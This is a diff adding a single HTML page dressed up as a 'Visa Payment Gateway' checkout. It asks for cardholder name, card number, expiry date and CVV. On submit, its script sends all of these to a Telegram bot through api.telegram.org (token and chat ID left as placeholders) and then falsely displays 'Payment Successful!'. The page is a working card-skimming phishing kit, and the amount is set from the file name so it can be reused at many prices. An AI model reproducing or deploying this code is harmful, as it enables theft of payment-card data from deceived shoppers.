@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Payment Gateway</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #f7b42c, #fc575e);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .payment-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #444;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, #42a5f5, #478ed1);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #478ed1, #42a5f5);
+        }
+        .visa-logo {
+            width: 50px;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa Logo" class="visa-logo">
+        <h2>Payment Gateway</h2>
+        <form id="paymentForm">
+            <!-- Amount Field -->
+            <div class="form-group">
+                <label for="amount">Amount (USD)</label>
+                <input type="text" id="amount" placeholder="$0.00" readonly>
+            </div>
+
+            <!-- Cardholder Name -->
+            <div class="form-group">
+                <label for="cardName">Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="Enter cardholder name" required>
+            </div>
+
+            <!-- Card Number -->
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
+            </div>
+
+            <!-- Expiry Date -->
+            <div class="form-group">
+                <label for="expiryDate">Expiry Date</label>
+                <input type="text" id="expiryDate" placeholder="MM/YY" required>
+            </div>
+
+            <!-- CVV -->
+            <div class="form-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" placeholder="123" required>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">Pay</button>
+        </form>
+        <p class="success-message" id="successMessage" style="display:none; color:green;">Payment Successful!</p>
+    </div>
+
+    <script>
+        // Get the file name from the URL
+        const fileName = document.location.pathname.split('/').pop().replace('.html', '');
+
+        // Extract the price from the file name (if it's numeric)
+        const price = parseFloat(fileName.replace(/[^0-9.]/g, '') || 0).toFixed(2);
+
+        // Set the amount dynamically
+        document.getElementById('amount').value = `$${price}`;
+
+        // Handle form submission
+        document.getElementById('paymentForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const amount = document.getElementById('amount').value;
+
+            // Send payment details to Telegram (replace with actual API details)
+            const telegramApiToken = "YOUR_TELEGRAM_BOT_TOKEN";
+            const chatId = "YOUR_CHAT_ID";
+            const telegramUrl = `https://api.telegram.org/bot${telegramApiToken}/sendMessage`;
+
+            const message = `
+                Cardholder Name: ${cardName}
+                Card Number: ${cardNumber}
+                Expiry Date: ${expiryDate}
+                CVV: ${cvv}
+                Amount: ${amount}`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('successMessage').style.display = 'block';
+                } else {
+                    alert('Failed to process payment.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while processing the payment.');
+            });
+        });
+    </script>
+</body>
+</html>
